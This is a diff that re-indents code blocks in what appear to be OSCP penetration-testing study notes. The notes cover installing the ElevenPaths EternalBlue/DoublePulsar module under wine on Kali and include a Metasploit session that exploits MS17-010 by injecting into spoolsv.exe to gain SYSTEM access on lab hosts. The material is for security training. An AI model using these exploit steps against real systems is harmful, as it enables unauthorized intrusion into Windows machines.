@@ -2176,7 +2176,7 @@ apt-get install pocl-opencl-icd
     -   You may find some boxes that are vulnerable to MS17-010 (AKA. EternalBlue).  Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box.  I have never had much luck using the built in Metasploit EternalBlue module.  I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following YouTube video:
     https://www.youtube.com/watch?v=4OHLor9VaRI
     
-    ```
+      ```
       1. First step is to configure the Kali to work with wine 32bit
       dpkg --add-architecture i386 && apt-get update && apt-get install wine32
       rm -r ~/.wine
@@ -2189,19 +2189,19 @@ apt-get install pocl-opencl-icd
       3. Move the exploit to /usr /share /metasploit-framework /modules /exploits /windows /smb
 
       4. Start metasploit console
-```
+      ```
 
 I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.
 
-```
-use exploit/windows/smb/eternalblue_doublepulsar
-msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
-RHOST => 10.11.1.73
-msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
-PROCESSINJECT => spoolsv.exe
-msf exploit(eternalblue_doublepulsar) > run
+      ```
+      use exploit/windows/smb/eternalblue_doublepulsar
+      msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
+      RHOST => 10.11.1.73
+      msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
+      PROCESSINJECT => spoolsv.exe
+      msf exploit(eternalblue_doublepulsar) > run
 
-```
+      ```
 
 
 -   Experimenting with Meterpreter
